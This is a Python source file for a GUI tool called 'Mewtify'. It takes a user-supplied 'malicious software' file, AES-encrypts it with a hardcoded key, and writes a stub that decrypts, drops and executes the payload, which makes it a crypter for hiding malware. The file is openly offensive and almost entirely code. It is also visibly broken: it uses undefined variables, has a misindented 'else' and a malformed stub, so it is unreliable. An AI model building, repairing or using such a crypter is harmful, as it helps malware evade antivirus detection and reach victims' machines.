#!/usr/bin/env python3
import tkinter as tk
import binascii, pyaes, sys, base64, os.path, os
from tkinter import *
from pathlib import Path
from tkinter.font import Font

def main():
    # Open file
    file_name = path # Malware path
    new_file_name = malwarename  # Path to drop file
    file = open(file_name, "rb")
    file_data = file.read()
    file.close()

    # Crypt file data (Using AES)
    key = bytearray("0123456789abcdef",'UTF-8')  # 16 bytes key - change for your key
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)


    # Create Stub in Python File
    stub = "import pyaes\n"
    stub += "crypto_data_hex = " + str(crypto_data) + "\n"
    stub += "key = " + str(key) + "\n"
    stub += "new_file_name = \"" + str(new_file_name) + "\"\n"
    stub += """
    # Decrypt
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = crypto_data_hex
    decrypt_data = aes.decrypt(crypto_data)
    # Save file
    new_file = open(new_file_name, 'wb')
    new_file.write(decrypt_data)
    new_file.close()
    # Execute file
    import subprocess
    proc = subprocess.Popen("python "+new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    """

    # Save the Stub
    stub_name = "1"+str(malwarename)
    stub_file = open(stub_name, "w")
    stub_file.write(stub)
    stub_file.close()

#GUI Dimensions
HEIGHT = 500
WIDTH = 700
root = tk.Tk()
#GUI NAME AND SIZE
root.title("MEWTIFY")
canvas = tk.Canvas(root, height=HEIGHT, width=WIDTH)
canvas.pack()
root.resizable(False,False)
#GUI HEADER
frame = tk.Frame(root, bg='#80C1FF' , bd=5)
frame.place(relx=0.5, rely=0.05, relwidth=1, relheight=0.2, anchor='n')
label=tk.Label(frame,text = "Welcome to Mewtify!", font=("-weight bold",27),bg='#80C1FF')
label.place(relx=0.3, rely=0, relwidth=.5, relheight=1)
#INPUT 1
label2=tk.Label(root, text="Malicous Software with full path:", anchor='w', font = 15)
label2.place(relx=0, rely=0.35, relwidth=0.47, relheight=0.15)
entry2 = tk.Entry(root, font=40)
entry2.place(relx=.5, rely=0.35, relwidth=0.45, relheight=0.09)
#INPUT2
label3=tk.Label(root, text="Name of Mutated Software:", anchor='w', font = 15)
label3.place(relx=0, rely=0.5, relwidth=0.45, relheight=0.15)
entry3 = tk.Entry(root, font=40)
entry3.place(relx=.5, rely=0.5, relwidth=0.45, relheight=0.09)
#GRABBING INPUTS
input1=entry2.get()
input2=entry3.get()
#button mashing
button=tk.Button(root, text="MEWTIFY", bg= "purple", font =40)
button.place(relx=0.3, rely=0.8, relwidth=0.45, relheight=0.15)
r = IntVar()
#options button
rbutton=tk.Radiobutton(root, text="option 2", variable=r, value=1).pack(side="right")
rbutton2=tk.Radiobutton(root, text="option 1", variable=r, value=2).pack(side="right")




check=0
path=input1
malwarename=input2
if clicked:
    #check if fullpath is valid
    my_file = Path(path)
    if my_file.is_file():
        check+=1
    else:
        check=0
        label4 = tk.Label(root, text="Please give a valid python file with the full path", fg='red')
        label4.place(relx=0.5, rely=0.7, relwidth=0.45, relheight=0.15)
    #check if name of file is input
    ncheck=malwarename.strip()
    if ncheck !="":
        check+=1
    else:
        check=0
        label5 = tk.Label(root, text="Please give a valid name", fg='red')
        label5.place(relx=0.5, rely=0.65, relwidth=0.45, relheight=0.15)

    #if all checks out execute main
    if count==2:
        b=tk.Button(frame, text="MEWTIFY", bg= "purple", font =40, command= main())
        label6 = tk.Label(root, text="MEWTIFIED! Please check the same folder for the file.", fg='green')
        label6.place(relx=0.3, rely=0.6, relwidth=0.45, relheight=0.15)
        else:
        # clear all inputs
        entry2.delete(0,END)
        entry3.delete(0,END)

root.mainloop()